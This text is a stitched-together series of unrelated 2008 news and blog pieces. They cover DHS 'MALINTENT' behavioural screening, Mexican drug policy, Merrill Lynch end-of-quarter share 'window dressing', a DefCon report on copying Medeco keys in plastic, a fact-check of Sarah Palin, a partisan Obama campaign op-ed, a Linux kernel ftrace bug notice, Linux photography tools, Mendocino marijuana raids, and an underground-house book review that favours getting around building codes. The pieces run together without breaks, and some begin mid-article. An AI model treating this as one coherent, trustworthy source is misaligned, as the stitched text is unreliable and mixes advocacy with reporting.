MALINTENT , the brainchild of the cutting - edge Human Factors division in Homeland Security 's directorate for Science and Technology , searches your body for non-verbal cues that predict whether you mean harm to your fellow passengers .
It has a series of sensors and imagers that read your body temperature , heart rate and respiration for unconscious tells invisible to the naked eye — signals terrorists and criminals may display in advance of an attack .
But this is no polygraph test .
Subjects do not get hooked up or strapped down for a careful reading ; those sensors do all the work without any actual physical contact .
It 's like an X - ray for bad intentions .
Currently , all the sensors and equipment are packaged inside a mobile screening laboratory about the size of a trailer or large truck bed , and just last week , Homeland Security put it to a field test in Maryland , scanning 144 mostly unwitting human subjects .
But what I can tell you is that the test subjects were average Joes living in the D.C. area who thought they were attending something like a technology expo ; in order for the experiment to work effectively and to get the testing subjects to buy in , the cover story had to be convincing .
While the 144 test subjects thought they were merely passing through an entrance way , they actually passed through a series of sensors that screened them for malintent .
Homeland Security also selected a group of 23 attendees to be civilian " accomplices " in their test .
They were each given a " disruptive device " to carry through the portal — and , unlike the other attendees , were conscious that they were on a mission .
In order to conduct these tests on human subjects , DHS had to meet rigorous safety standards to ensure the screening would not cause any physical or emotional harm .
So here 's how it works .
When the sensors identify that something is off , they transmit warning data to analysts , who decide whether to flag passengers for further questioning .
This next step involves microfacial scanning , measuring minute muscle movements in the face for clues to mood and intention .
Homeland Security has developed a system to recognize , define and measure seven primary emotions and emotional cues that are reflected in contractions of facial muscles .
MALINTENT identifies these emotions and relays the information back to a security screener almost in real - time .
This whole security array — the scanners and screeners who make up the mobile lab — is called " Future Attribute Screening Technology " — or FAST — because it is designed to get passengers through security in two to four minutes , and often faster .
If you 're rushed or stressed , you may send out signals of anxiety , but FAST is n't fooled .
It 's already good enough to tell the difference between a harried traveler and a terrorist .
Even if you sweat heavily by nature , FAST wo n't mistake you for a baddie .
" If you focus on looking at the person , you do n't have to worry about detecting the device itself , " said Bob Burns , MALINTENT 's project leader .
And while there are devices out there that look at individual cues , a comprehensive screening device like this has never before been put together .
While FAST 's batting average is classified , Undersecretary for Science and Technology Adm.
Jay Cohen declared the experiment a " home run . "
As cold and inhuman as the electric eye may be , DHS says scanners are unbiased and nonjudgmental .
" It does not predict who you are and make a judgment , it only provides an assessment in situations , " said Burns .
" It analyzes you against baseline stats when you walk in the door , it measures reactions and variations when you approach and go through the portal . "
But the testing — and the device itself — are not without their problems .
This invasive scanner , which catalogues your vital signs for non-medical reasons , seems like an uninvited doctor 's exam .
It raises many privacy issues .
But DHS says this is not Big Brother .
Once you are through the FAST portal , your scrutiny is over and records are n't kept .
" Your data is dumped , " said Burns .
" The information is not maintained — it does n't track who you are . "
DHS is now planning an even wider array of screening technology , including an eye scanner next year and pheromone - reading technology by 2010 .
The team will also be adding equipment that reads body movements , called " illustrative and emblem cues . "
According to Burns , this is achievable because people " move in reaction to what they are thinking , more or less based on the context of the situation . "
FAST may also incorporate biological , radiological and explosive detection , but for now the primary focus is on identifying and isolating potential human threats .
And because FAST is a mobile screening laboratory , it could be set up at entrances to stadiums , malls and in airports , making it ever more difficult for terrorists to live and work among us .
Burns noted his team 's goal is to " restore a sense of freedom . "
Once MALINTENT is rolled out in airports , it could give us a future where we can once again wander onto planes with supersized cosmetics and all the bottles of water we can carry — and most importantly without that sense of foreboding that has haunted Americans since Sept. 11 .

Since December 2006 about 30,000 troops have entered eight states in Mexico in an attempt to quell drug prohibition violence , but almost 3,000 people have been killed this year due to drug trafficking violence .
According to the New York Times October 3 , 2008 article , ( " Mexican President Proposes Decriminalizing Some Drugs " ) " President Felipe Calderon , who has made fighting drug traffickers the centerpiece of his administration , proposed legislation on Thursday that would decriminalize the possession of small quantities of cocaine and other drugs for addicts who agreed to undergo treatment .
Mr. Calderon said that the proposal was intended to attack the growing problem of drug addiction in Mexico .
Still , it will probably be controversial both at home and abroad .
A similar measure two years ago provoked strong opposition from the United States and was eventually dropped . "
The article states , " A recent government survey found that the number of drug addicts in Mexico had almost doubled in the past six years to 307,000 , while the number of those who had tried drugs rose to 4.5 million from 3.5 million .
Drugs used to flow through Mexico to the United States , and they still do , but an increasing amount of those narcotics now stays in Mexico to feed the habits of domestic consumers .
Under Mr. Calderon 's proposal , Mexican authorities would not prosecute people found to be carrying small amounts of drugs if they declared they were addicts and submitted to a treatment program .
Those who are not addicts could avoid prosecution by entering a prevention program .
Fines could be imposed for those who declined to enter such programs .
The new legislation caps the quantities that would not be subject to prosecution at 50 milligrams of heroin , 2 grams of marijuana , 500 milligrams of cocaine and 40 milligrams of methamphetamine .
The Mexican attorney general 's office has said that it is so overwhelmed with prosecuting organized crime that it cannot handle the large number of small - time drug cases . "
The article adds , " The measure is reminiscent of a proposal that passed the Mexican Congress two years ago but never took effect .
It decriminalized possession of small amounts of drugs for people who could convince a judge that they were addicts .
That law , which did not require treatment for those found with drugs , provoked an uproar among United States officials , some of whom raised the image of Americans going to Mexico to enjoy legal drugs .
Under intense lobbying from the United States , Vicente Fox , the president at the time , asked Congress to amend the law and the measure was dropped .
Responding to Mr. Calderon 's plan , American officials said Thursday that United States policy opposed the legalization of even small amounts of drugs . "
We 've been hearing a lot about bear raids and short selling market manipulation lately but upside manipulation is far more common .
A recent investigation in Australia has revealed that Merrill Lynch allegedly engaged in " window dressing . "
Here 's how this particular scam works .
A fund manager who is supposed to report his gains at the end of the quarter buys up a single share at an inflated price just before the market closes .
The tick on the stock jumps at the close , and the fund manager gets to account for the stock at the higher price .
It 's an instant -- and instantly vanishing - - gain .
But do n't worry .
Merrill was n't doing this for itself .
It was just serving it 's clients needs !
( Who happened to be a fund manager who was cheating his clients . )
Here 's how the Australian describes it .
The Australian understands that Merrill Lynch was acting on behalf of a client , a small - cap fund manager .
In one instance , Merrill Lynch purchased one share in listed finance company Murchison Holdings at 2.49 pm on September 30 for $ 1.50 .
It was the only registered trade in the company that day and saw its share price close 19 per cent higher .
The broker 's purchase of one Global Iron share for 22 c saw the company 's share price close 8 c higher at 22c .
Other stocks traded by Merrill Lynch in a similar fashion include miners Graynic Metals , Nupower Resources , Austin Exploration , Primary resources , Natasa Mining , Red Metal , property company Ariadne Australia , and biotechs Heartware and Halcygen Pharmaceuticals .
Proof that PR companies are starting to understand which techie buttons to push comes in the form of a video of Windows Mobile apparently running on an Apple iPhone , despite the insanity of such a proposition .
The video is supposedly shot at the " myPhone 2008 " show in Las Vegas , and while the city plays host to an awful lot of shows , that particular one is notable for its lack of existence .
The companies in the background are n't real either , with the notable exception of Sonic Emotion .
So what we have a nicely put together viral video that has all the right metatags - mobile , iPhone , Windows , gadget , hack - and gets lots of publicity for Sonic Emotion ( after all , we 're reporting it too ) .
So , by way of impotent protest , we shall decline to explain what Sonic Emotion do , or sell . ®
Researchers at DefCon in Vegas have demonstrated that they can make " high security " Medeco key - blanks out of the plastic used in credit - cards , and then whittle them into working keys by referring to low - resolution photos of original keys .
" Basically , we 've destroyed Medeco 's key control , because we can make ( plastic keys ) for any of their M3 locks and a lot of their Biaxial locks , which is their last generation of locks , " says Tobias , who authored the book Open in Thirty Seconds , with Bluzmanis .
The researchers demonstrated the technique using a Medeco mortise cylinder that Threat Level purchased in California before leaving for Las Vegas .
After buying the lock , Threat Level scanned the key and e-mailed the image to the researchers , who then created several plastic keys .
When Threat Level arrived in Las Vegas with the lock , it took about six seconds to open the lock using a plastic key .
" It 's keys by e-mail , " says Tobias .
" It 's key - mail . " …
The Medeco M3 key does have an extra feature to secure the lock — a step protrusion on the side of the key that 's designed to move a slider inside the lock .
But last year at DefCon , Tobias and his colleagues showed how they could simply insert the end of a bent paper clip into a Medeco high - security lock to push back the slider , rendering the slider ineffective as a security layer .
Once that is done , they 're then able to insert the plastic key in this new attack , to lift and rotate the pins .
At the vice presidential debate in St. Louis , Sarah Palin defended John McCain 's health care plan and criticized Barack Obama's .
Obama has a plan " to mandate health care coverage and have a universal government - run program , " Palin said .
" And unless you 're pleased with the way the federal government has been running anything lately , I do n't think that it 's going to be real pleasing for Americans to consider health care being taken over by the feds . "
Problem is , Obama 's plan keeps the free - market health care system intact , particularly employer - based insurance .
It is not a goverment - run program and is very different from the health care systems run by the government in some European countries .
Obama 's plan essentially takes the health care system as it is today and seeks to expand it to the uninsured .
The plan increases eligibility for the poor and children to enroll in initiatives like Medicaid and the State Children ’s Health Insurance Program .
It also creates pools for individuals to buy their own cheaper insurance .
And it outlines several strategies aimed at reining in costs for everyone , such as streamlining medical record - keeping and emphasizing preventive care .
Obama 's plan does not mandate coverage , except for children .
Obama said often during the Democratic primary campaign that he did not include a mandate for adults so as not to penalize people with modest incomes .
His reasoning for not including a mandate for adults was this :
If premiums do n’t drop enough after his reforms are implemented , people will still be unable to afford insurance .
If a law mandates they buy it anyway , they probably wo n’t .
Obama ’s argument is that if you then fine them , you ’re essentially punishing the poor — and they will still be uninsured .
Obama said he hopes his plan will lower costs enough that many of the estimated 47 - million uninsured will sign up without a mandate , and a mandate will come later .
Obama has said he would like it to be universal , in that everyone has health care coverage .
So Palin is mostly wrong about Obama 's plan having a mandate ; it only has one for children .
He would like it to be universal at some point .
She also emphasized that Obama proposes government - run health care , a statement that is completely inaccurate .
Taking all that together , we rate her statement Barely True .

Former Clinton administration economist and Obama adviser Jason Furman says plan would foster growth .
( CNN ) -- President Bill Clinton 's appearance at the Democratic National Convention last night served as a reminder of the economy we can have with policies that balance fiscal responsibility with investments in our people .
Under President Clinton 's leadership , the economy created 23 million new jobs and working - age households saw their incomes rise by $ 7,500 .
President Clinton 's presence provided a stark contrast with the failures of President Bush 's trickle - down economic philosophy -- a philosophy that John McCain has embraced and Barack Obama and Joe Biden utterly reject .
Instead of more of the same failed policies of recent years , Barack Obama and Joe Biden have an economic plan premised on fostering bottom - up growth .
They would help get the economy moving again by relieving the burden on families with energy rebates of $ 1,000 and by saving more than 1 million jobs with $ 50 billion in immediate measures .
They would foster security and success for America 's families by making sure every family has affordable health insurance , investing in America 's energy independence while creating 5 million green jobs , cutting taxes for small businesses and 95 percent of workers and their families , and by ensuring that Americans have world - class education from pre-school through college .
At the same time , Obama and Biden believe that any benefits of their plans for healthcare , energy , education or middle - class tax cuts could be undone if they were not paid for in a fiscally responsible manner that cuts overall spending .
That is why they will end the war in Iraq responsibly , a conflict that is costing more than $ 10 billion per month .
That is why they will take on the lobbyists that garner special favors for HMOs in Medicare , banks that make student loans , and high - income corporate farmers .
And that is why they will ask families making over $ 250,000 to give up a portion of the tax cuts got from President Bush .
In contrast , McCain wants more of the same policies President Bush pursued .
President Bush added $ 4 trillion to the deficit , John McCain 's policies would another $ 4 trillion .
See where McCain and Obama stand on economic issues
President Bush pursued tax cuts for the wealthy and corporations while cutting investments from Head Start for children to medical research .
John McCain wants more tax cuts for corporations and his policies neglect investments in our people .
President Bush put the middle - class last when it came to his policies , John McCain would leave 101 million households out of his tax cut and eventually raise taxes for tens of millions of households by forcing them to pay taxes on their health insurance .
Under President Bush the economy has had the first so - called economic " expansion " on record where the typical family saw its income fall ( by more than $ 2,000 ) , and under John McCain the results could be even worse for jobs and incomes .
The economic challenges the country faces today are different and in some ways more challenging than what President Clinton inherited in 1992 .
The squeeze facing middle class families is more intense , with declining incomes meeting skyrocketing costs for everything from gas to groceries to healthcare .
While President Clinton , together with the hard work of then - first lady Hillary Clinton , made progress on health care with the passage of the Children 's Health Insurance Program , today the rapidly rising cost of health care is a more serious threat to our families and our economy than ever before .
And the energy security and climate change challenges we face are nearly unprecedented in the danger they pose to America 's national security , economy and even way of life .
But some important similarities remain .
Just as in 1992 and 1993 , the Republican attack machine is trying to spread fear that Barack Obama 's economic plan will spell disaster .
Phil Gramm , who helped design Sen.
McCain 's economic plan and who stepped down as the candidate 's campaign co-chair after he called America a " nation of whiners , " warned in 1993 that President Clinton 's plan was a " one - way ticket to a recession . "
Well , they were wrong then , and they are wrong now .
A change in America 's economic policies that cuts taxes , cuts health costs , and helps make America energy independent of Middle East oil , will foster both stronger growth and broader - based participation in that growth .

Probable e1000e corruption culprit found ( and 2.6.27.1 released )

due to possible memory corruption on module unload Date : Wed , 15 Oct 2008 18:21:44 - 0400 ( EDT ) Message - ID : < alpine.DEB.1.10.0810151815110.18960@gandalf.stny.rr.com >
Cc : Linus Torvalds < torvalds -AT- linux- foundation.org > , Andrew Morton < akpm-AT-linux- foundation.org > , Arjan van de Ven < arjan - AT - infradead.org > , gregkh - AT - suse.de , jesse.brandeburg-AT-intel.com , Thomas Gleixner < tglx-AT-linutronix.de > , Ingo Molnar < mingo- AT- elte.hu >
While debugging the e1000e corruption bug with Intel , we discovered today that the dynamic ftrace code in mainline is the likely source of this bug .
For the stable kernel we are providing the only viable fix patch : labeling CONFIG_DYNAMIC_FTRACE as broken .
( see the patch below )
We will follow up with a backport patch that contains the fixes .
But since the fixes are not a one liner , the safest approach for now is to disable the code in question .
The cause of the bug is due to the way the current code in mainline handles dynamic ftrace .
When dynamic ftrace is turned on , it also turns on CONFIG_FTRACE which enables the - pg config in gcc that places a call to mcount at every function call .
With just CONFIG_FTRACE this causes a noticeable overhead .
CONFIG_DYNAMIC_FTRACE
works to ease this overhead by dynamically updating the mcount call sites into nops .
The problem arises when we trace functions and modules are unloaded .
The first time a function is called , it will call mcount and the mcount call will call ftrace_record_ip .
This records the calling site and stores it in a preallocated hash table .
Later on a daemon will wake up and call kstop_machine and convert any mcount callers into nops .
The evolution of this code first tried to do this without the kstop_machine and used cmpxchg to update the callers as they were called .
But I was informed that this is dangerous to do on SMP machines if another CPU is running that same code .
The solution was to do this with kstop_machine .
We still used cmpxchg to test if the code that we are modifying is indeed code that we expect to be before updating it - as a final line of defense .
But on 32 bit machines , ioremapped memory and modules share the same address space .
When a module would load its code into memory and execute some code , that would register the function .
On module unload , ftrace incorrectly did not zap these functions from its hash ( this was the bug ) .
The cmpxchg could have saved us in most cases ( via luck ) - but with ioremap - ed memory that was exactly the wrong thing to do - the results of cmpxchg on device memory are undefined .
( and will likely result in a write )
The pending .28 ftrace tree does not have this bug anymore , as a general push towards more robustness of code patching , this is done differently : we do not use cmpxchg and we do a WARN_ON and turn the tracer off if anything deviates from its expected state .
Furthermore , patch sites are statically identified during build time so there 's no runtime discovery of dynamic code areas anymore , and no room for code unmaps to cause the hash to become out of date .
We believe the fragility of dynamic patching has been sufficiently addressed in the development code via the static patching method , but further suggestions to make it more robust are welcome .

I promise I will not turn that into a habit , but after quite a few months and more than 100 entries in this blog , I feel like it is time for a little rant indepth analysis summary of where we stand .
I mean of where Linux stands as far as photography is concerned .
Graphics and photography have been Apple ’s chasse gardée for years but for quite some time , MS Windows is on par with the Mac and the system of choice for photographers boils down to personal preferences more than anything else .
Mac users have the exclusivity of Apple Aperture , but Photoshop and Lightroom , Adobe ’s behemoths , are available on both platforms – and the CS4 64 bits version of Photoshop for Mac will be delayed due to the necessity to porting it to Cocoa .
Maybe Adobe could port it to QT and offer a Linux version , but I digress …
So what about Linux then ?
My goal with this entry is to brush a big picture of where Linux stands as far as photography is concerned .
What are the achievements , where improvement are needed and being worked on and which pieces are still missing .
I will survey what I consider the 3 main areas that an OS has to cover for serious photography work : color management , printing support and workflow .
Note that this is a summary of subjects that are covered in more detail elsewhere in this blog ; I provide internal links where appropriate .
Color Management
Color Management is about ensuring color consistency throughout all your work ( graphic chain ) .
What you see on your screen has to match what will come out of your printer and viewing your image on another monitor should not alter its colors .
Obviously , Color Management is a crucial part of an OS that is used for photography .
This is certainly an area where Linux has done great progress recently .
Most application are CM aware and Xorg has been supporting monitor profiles VGC Tags loading through xcalib and dispwin .
We also have Argyll supporting most monitor calibration tools , including the cheaper ones like Huey and Spyder , the notable exception being the newly born Spyder 3 .
Missing and being worked on , we find a GUI way to calibrate a monitor – the next version of LProf should offer that .
Missing as well is a central way to manage profiles : I should not need to tell each and every application to use AdobeRGB as editing profile , where my monitor profile is and which rendering intend I want .
Oyranos ’s aim is to provide such a framework , but it is n’t widely used yet – only in Cinepaint , afaik .
It would be a waste to have each application or desktop environment developing a different framework – the openicc mailing list hosted at freedesktop is the central place where this type of discussion is being held .
The one missing piece is printer calibration .
Recently , with A3 prints becoming an available standard and multiple paper references , “ affordable ” printer colorimeters are starting to appear on the market .
These are n’t supported under Linux for now , so the printer / paper / ink profile ’s measurements have to be done in another OS .
I do n’t think anyone is working toward supporting these products in Linux .
Printing
Speaking of printing , this is another area where digital photography has modified ( most ) photographers habits .
It is now possible to handle our images ourselves from capture to exhibition quality print .
Even if it is still possible to send images to processing labs , home printers allow very high quality print and can be coupled with a vast choice of papers – yes it has a ( high ) price , but it is also a great side of the creative photographic process .
Printing manufacturers basically have to handle 2 problems : 1 ) make ( very ) small drops of ink placed ( very ) precisely on the paper ; 2 ) blend the drops from the different ink colors in a way that allows subtle nuances and perfectly continuous gradients .
The fist task is in the hardware hands and although there are minor differences , all the leading manufacturer ( ie Epson , HP and Canon ) achieve very good results both in terms of quality and longevity , as long as you pick the right combination of ink and paper .
The second task , however , is in the driver ’s hands .
Obviously , I am not able to test all models from all manufacturers , but here is the situation : HP has been sponsoring HPIJS and HPLIP as high quality driver for Linux which works for most HP printers and includes bells & whistles such as scanning .
It also offers a high quality photo mode which I have been using for a while with ( almost ) complete satisfaction .
On the Epson side , the Gutenprint project aims to “ provide high quality printing for UNIX ( including Macintosh OS X 10.2 , 10.3 , and 10.4 ) and Linux systems that in many cases equal or exceed proprietary vendor - supplied drivers in quality and functionality ” .
Canon has recently joined the A3 photography quality club with its Pixma Pro line .
However , these are n’t yet supported in Linux .
So have a check at the Gutenprint / Hplip website before you buy a new photo printer if you want to make sure it works with Linux .
Here is a little checklist to be able to do high quality photo printing under Linux :
Check if your printer is supported , especially for Black & White output ; borderless printing is a hit and miss as well .
If you have a colorimeter , use Windows to create your custom ICC print profiles or ( if you only need a couple of profiles ) have someone do them for you .
printer color management is not always transparent .
You have to convert your file to your printer profile manually before sending it to the printer – at least with Cinepaint , which offers the most advanced color management
OK , this looks like a lot of hassle but these are things you do only once : choosing a printer , a paper / ink combination and having an ICC profile made for this combination .
And converting a file to the printer profile is more a habit to take than anything else ; plus support for Color Management is being worked on in Gutenprint .
My experience of printing under Linux has been a success – although it is rather limited .
Workflow
From loading your picture from your camera to tagging and archiving them , workflow is very important and … quite hard to define .
Workflow is about how seamless the photographic process is : loading images , sorting them out , post - processing , printing , tagging and archiving them .
And all of that while keeping the highest quality for the images , of course .
So this means either one software doing everything with the danger of becoming dog slow , over - complicated and a useability nightmare or having several specialized applications working hand in hand with the danger of the apps not working seamlessly together and ending up in an over - complicated process .
Well , it is all dealing about complexity , and indeed , digital photography processing is a complex process .
How to go about it ?
Open Source Software Development ( and its “ bazaar ” development model ) has shown an ability to tackle major projects such as the Linux kernel or ( more recently ) OpenOffice or Firefox – though not without bumps on the road .
However , the Unix tradition is more like “ one tool for one task ” and we have seen numerous tools on Linux for most photography related tasks .
Some are command line based : GREYCStoration ( denoising ) , DVD - Slideshow , xcalib and the ArgyllCMS suite ( calibration ) not to forget the powerful imagemagick suite .
UFRaw ( raw converter ) can be used both as a command line tool or with a GUI .
Add to the mix Gimp , Cinepaint and Krita ( editing ) , Rawstudio ( raw converter ) a myriad of image viewers ( GThumb , Gwenview , Gview or Mirage ) , a couple of “ image management programs ” ( F - Spot and Digikam ) and a few metadata and tags editors ( jbrout , xmpmanager … )
You guessed it : it is a mess bazaar .
A few chosen examples :
I can achieve high quality denoising by choosing the parameters in a Gimp - plugin but then I have to run the command - line version of GREYCStoration to keep a 16 bits / channel image .
I can view my JPEG images in Rawstudio but not modify them .
I can view RAW thumbnails in GThumb but I ca n’t do anything with them ; but GThumb allows me to view and modify JPEG .
The only way to edit a picture in 16 bits modes is with Cinepaint ; it does the job but misses quite a few “ must have ” like preview for unsharp mask , effect layers , etc. Krita has proved to crashy for me and Gimp is limited to 8 bits .
The list goes on .
Basically , it is working , but it is clunky .
So what do we need , what is missing and being worked on and what is definitely not on the radar screen ?
High bit depth editing
Linux definitely needs a credible high quality photo retouching program .
Cinepaint has a Ferrari engine inside an old 2CV , while Gimp has the 2CV engine inside a Ferrari .
Krita is taking more the direction of a high flying painting program than a photo editor .
So this piece is badly needed although being worked on with Cinepaint ’s next generation ( Glasgow ) and the integration of GEGL in Gimp .
If I was a billionaire in charge of a Linux distribution , I would hire Sven and Mitch to work on Gimp full time … now that the plan is clear and that real productive work is being done , that would be a project with high visibility in the community .
Without this , Linux will just not cut it for serious photography .
RAW Conversion
Another important step is the RAW conversion .
Again , the balance between the possibilities of RAW tweaking and the necessity to keep the software reactive and its complexity under control is tricky .
If you read this blog , you ’ll know that my favorite converter is Rawstudio for its speed , simplicity and “ well - thoughtness ” – it is developed by people who were photographers before being software developers …
However how do I correct lens vignetting , purple fringing and distortion ?
That is where the Lensfun project comes in : a database of lenses / body characteristics that allow for automatic lens defects correction ( à la DXO ) .
Other areas where Rawstudio needs some love are denoising , exif support and contrast boost ( unsharp mask with large values ) .
At that point , you will mention RawTherapee and you will be right : it does all of that .
But the price to pay is too dear for me , in terms of speed and interface complexity .
But do n’t hesitate to check RawTherapee , hundreds are very happy with it .
Or LightZone , now that its ( paying ) Linux version is back on track .
To each its own .
Image management
Then there is the image viewing / management / tagging issue .
In the proprietary world , this is handled by Lightroom which does file management and RAW conversion .
Even if there is a lot of choice of image viewers / managers in Linux it still is hard to find “ a good one ” mainly because there are so many interpretation of what “ a good one is ” :
Photo organizer ( Digikam / F - Spot ) that do everything for you , including copying your files , image edition , raw development …
Photo viewer ( Gthumb , Gwenview ) that are “ just ” showing you the images in a current folder and have basic editing capabilities
As far as I am concerned , what I need is :
display quickly any file type ( including RAW )
thumbnails / image / metadata / folder browsing panes that can be moved around and hidden
full exif and XMP tags management / search support
slideshow / fullscreen
create contact sheets ( I know , this looks like a gadget , but it comes in very handy )
right - click on an image to open it in the raw converter / image editor
Color Managed
What I do n’t need is :
Image edition ( there are better tools for that )
What I do n’t want is :
a program that copies / moves / saves my files by itself
I am yet to find the perle rare , although GThumb is pretty close ( with quite a few extras that I do n’t need ) and with missing parts being worked on in SVN .
Other candidates are Geekie and Gwenview ( for KDE users ) .
Making them work together
And remember that these have to work closely together .
A little option like “ Export to Gimp ” in Rawstudio is the perfect example of something simple that makes life easier ( at least that will be the case when Gimp supports higher bit depth ) .
I do n’t think we need a billion apps for photography .
In fact , I have argued that it boils down to 3 :
a high bit - depth capable editor
a well thought RAW converter
an image viewer / manager / tagger
All of them keeping exif datas , supporting xmp tags and allowing 1 click opening images in each other ( open in ImgEditor , open in RawConverter , open in ImgViewer ) .
At the end of the day , it does n’t look very difficult .
But it is always easier to write a blog entry than good code .
Plus there is this push for more features that has been a trap in open source projects – and closed source , when you come to think of it .
I can live with having a few “ on the side programs ” for special tasks like DVD - Slideshow generation , Panorama stitching and HDR – and yes , these exist in Linux .
Xorg dual screen
Once you started using dual screen , it is very hard to go back to single screen ; having your image displayed fullscreen on a calibrated monitor while keeping your tools on another monitor is such a productivity and comfort boost .
It is not like Xorg does n’t support dual screen .
It is that it is such a pain in the ass neck to set it up .
But with the new xrandr 1.3 , proper monitor hotplug is being supported and we start to see GUI coming for an easy configuration ( grandr , krandr ) .
As always with Xorg , there is then the question of your particular graphic card ’s driver supporting the feature , but with Intel and more recently AMD ( ex ATI ) opening their specification and the dynamism of Xorg / Freedesktop community , this is an area where there is hope – just think about recent achievements like compiz or xorg .conf ( almost ) disappearing .
Conclusion
I do n’t think that the answer to Linux for photography is “ Photoshop & Lightroom on Linux ” .
Open Source Software has developed some amazing pieces of software and I do n’t see why photography would be an exception .
My dominant feeling is “ work in progress ” and I see the “ Linux photography ecosystem ” maturing and moving forward in the right direction .
But let ’s face it : Linux is not a drop - in replacement for Windows or MacOS for photography yet .
Far from it .
You can use Linux for serious photography , but critical pieces are still missing or are too kludgy for efficient work ; you need to be willing to accept sacrifices .
I use Linux for photography as an amateur , but I would never recommend Linux to a pro photographer with time / production constraints .
Still , my hope is to see Linux maturing to the point of being a great OS for photography .
And this hope is strong enough to keep me blogging about it 🙂

There are an estimated 200,000 qualified cannabis patients in California with thousands of arrests and prosecutions over the past 12 years as we struggle to get law enforcement off our backs and into a court of law .
In Mendocino County , a centerpiece for the tug - of - war now playing itself out , hundreds of marijuana cases , medical and non-medical alike , have been thrown in together and prosecuted as criminal .
After Sheriff Tony Craver retired and DA Norm Vroman died , the respectful " working relationship " with the patient community that both men had cultivated while in office ended .
They achieved the respect of their constituents and the medical marijuana community for implementing the new law with fair - minded written guidelines arrived at with input from patients .
But since interim Sheriff Kevin Broin took over in 2006 followed by Sheriff Tom Allman in 2007 with Meredith Lintott as DA , we have regrettably returned to the prohibitionist mode of adversarial relations , where no one seems to be working together , where cops have become robbers and patients ' rights are treated as a criminal nuisance .
Broin came and went but in that year , he mopped up the area pretty good , leaving hundreds of marijuana cases in his wake without regard to medical use .
Sheriff Tom Allman has pretty much followed in Broin 's footsteps with no accountability for his broken promises .
Relative to the Craver - Vroman era , we estimate that medical marijuana arrests and prosecutions have increased 10 - fold .
Guestimates are that 20 prosecutions in that era amounts to as many as 200 now .
This is clogging the Mendocino County courts with medical innocents along with the " guilty " .
Many of these wrong - headed prosecutions , such as the cases of Laura Hamburg and Angie Pinches , both young women , are thrown out on motions to dismiss and bogus search warrants with judges angrily denouncing rogue police practices , such as " 3 am sneak and peek " and " intentional omission of material fact " .
But most medical marijuana cases go through a harsh criminal justice process -- where justice consists of intimidation , coercion , asset forfeiture , over - charging , seizure of kids and other threats where it hurts most -- that brings many innocent people to their knees accepting some sort of guilt when what they did was legal -- an innocent medical act .
Whereas many previous bogus cases have been brought against young people who are able to sustain a court fight , such as Laura Hamburg , there is a trend toward targeting the elderly as the most vulnerable of the low - hanging fruit -- the poor , the ill and the elderly .
For example , the 90 - year - old couple , Lester ( " Smitty " ) and Mary Smith - - who were raided at their Philo home last week ( 9.24.08 ) with law enforcement seizing their life savings and all their plants in the process -- are qualified patients with doctors ' approvals and did nothing wrong .
Smitty said , " I was n't worried a bit .
I knew it was legal .
I planted six plants two years in a row and this year , I planted 17 for me and Mary .
That 's not too many is it ?
My wife is very ill , confined to a wheelchair or recliner .
She likes the bud tea .
She has severe arthritis .
It makes it easier for her to get around .
She walks easier ; she can walk to the bathroom even by herself .
" Smitty has health issues too .
" I have heart problems , blood clots , stomach cramps , emphysema , bad hips .
I 've had a heart attack .
I sometimes get strong chest pains and can't breathe right .
I take nitroglycerine .
That brings me back .
My doctors want me to take more x-rays here locally but that would be a big expense .
Usually , I go to the Veterans Hospital and they pay for it .
" Mary Smith was forced to stay in the house by herself during the 5 - hour raid while additional warrants for an adjoining parcel were telephoned in and delivered , allowing sheriff 's deputies to enter all the residences .
The elderly Smiths were not arrested or charged with a crime , because there was none .
Sheriff 's deputies were apparently more interested in robbery than arrest ( excuse my french ) .
They seized the two things that mattered most to the ill couple -- their medicine , all 17 plants , leaving nothing -- and their life savings , $ 52,000 from Mary Smith 's inheritance and $ 29,000 in cashed in CDs .
" As soon as the bail - out hit , I cashed in my CDs and put the money in a safe in my house .
I did not sell pot to get it .
But turns out my money was not safe .
They stormed in here and turned our world upside down .
I thought I was legal .
" Armed with records and receipts and Keith Faulder as his attorney ( 707-548-7976 ) , Smitty is confident of getting his money back , months up the road .
Is this the kind of law enforcement treatment elderly patients must look forward to in their waning years ?
Stay tuned for net week 's elder raid in Willits .

Classic guide to low - cost subterranean dwelling
My wife and I had some property , but not enough money to build a house without going into debt .
We enjoyed staying in a cave B&B in France and love the Troglodyte dwellings in Trôo , France .
After consulting several books , including one by Rob Roy , this book just made the most sense .
The methods are so low tech , a bum could make himself a mansion .
Other books get into engineering with concrete , steel , rebar , etc. , which cost a fortune and do n’t necessarily function any better and , in some cases , maybe not as well .
With this book and the videos , which are a must if you get serious , you really can build a home for the cost of a roll of plastic and a few other items , provided you do the labor by hand and scrounge materials .
Mike explains succinctly what took him years to figure out and you may might never discover otherwise : how to get in light from all four sides , how to protect untreated wood , how to connect the log post and beams together with pins made of low cost rebar , how to evenly compact the earth backfill by hand as to allow nature to finish the job ( the backfill also functions as earthquake bracing keeping you tight under the surface rather than hinging at the point where the building meets the ground , a method similar to what Frank Lloyd did to prevent quake damage in Japan ) .
Mike shows how to make a foyer or a gable to keep water flowing around the door opening rather than across it .
Skylights are notorious for leaking , even on a conventional house .
So Mike invented the “ sun scoop , ” a method I used that allows natural light to shoot right through the full length of the underground complex at different times of the day and year depending on your design and desires .
He also shows how to make clerestory windows to let light into the high side of the house through an uphill patio or a wraparound .
I was a bit skeptical at first .
How could all of this work and be so cheap ?
This type of dwelling is not for everyone , but if you do it right it really does provide great shelter .
There are engineering tables in the back of the book providing rule of thumb guides and safety information .
It wo n’t get you something that will pass a code inspection , but I ’m of the opinion codes and building regulations are written in part to provide sales for corporations and taxes for the government .
A friend of ours designed a small underground house .
She wanted to go with engineers and permits .
Last estimate : $ 1.5 million dollars .
And she has yet to get it approved .
Sadly , she will never build her dream .
This book even has a chapter of strategies for getting around that .
Keep in mind , too , this book is not a house plan .
You learn how to build nearly any design you want .
Just put the safe framing building blocks together in a design that suits you , keeping the important rules and directions in mind .
After the basic structural requirements are met , the only limit is your imagination …
We started our house in 2002 and had a very crude shelter within a couple months .
I framed in about 2,000 square feet , made about a thousand or so fairly comfortable , and continue to expand into it as we need it .
We have a studio apartment area , a master bedroom and two bathrooms , as well as a porch area with a conversation pit , uphill patio , green house and shop .
We have added a large garden to raise much of our own food , a carport , wood shed and two - story rammed earth , rock and salvaged boat dock and bridge timber garage .
With natural earth temps around 50 at night , only a small fire in the wood stove is required to keep things warm .
The roof is a garden .
It feeds and shelters us and provides a park - like setting with flowers all around .
There is no exterior painting required .
Nothing to become an eyesore as the paint chips and deteriorates and the shingles rot off .
Sure it takes maintenance and there are issues to deal with but if you build it , you will be intimate enough with it to know what to do .
My home is growing .
